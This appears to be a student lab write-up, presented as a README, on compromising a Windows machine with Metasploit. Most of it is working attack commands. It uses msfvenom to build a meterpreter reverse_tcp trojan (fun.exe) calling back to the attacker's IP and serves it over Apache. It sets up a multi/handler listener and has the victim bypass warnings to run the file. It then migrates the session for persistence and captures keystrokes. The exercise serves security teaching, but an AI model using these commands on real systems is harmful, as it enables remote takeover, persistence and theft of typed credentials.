# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![Screenshot 2025-04-07 110001](https://github.com/user-attachments/assets/8cde1e5a-5319-4f72-81c4-9f09f8204798)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2025-04-07 111202](https://github.com/user-attachments/assets/a5850360-7890-4b7d-b3bf-f84f7eec2f96)





copy the fun.exe into the apache /var/www/html folder
![Screenshot 2025-04-07 115010](https://github.com/user-attachments/assets/f556dedd-f7d9-47bc-b786-0d2017262af3)



Start apache server
sudo systemctl apache2 start

![Screenshot 2025-04-07 115019](https://github.com/user-attachments/assets/f8a3a5db-f3a1-4089-865b-bf898995674f)



Check the status of apache2
![Screenshot 2025-04-07 115108](https://github.com/user-attachments/assets/e5f1d4d7-126a-4b09-b6ef-eb06a680981f)




Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/fee0700e-bafd-4e76-af72-f5ac23a5d6ba)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![9](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/85fb473c-59fe-4042-b163-552fddc735d1)



keyscan_dump	Shows the keystrokes captured so far
![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)



## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
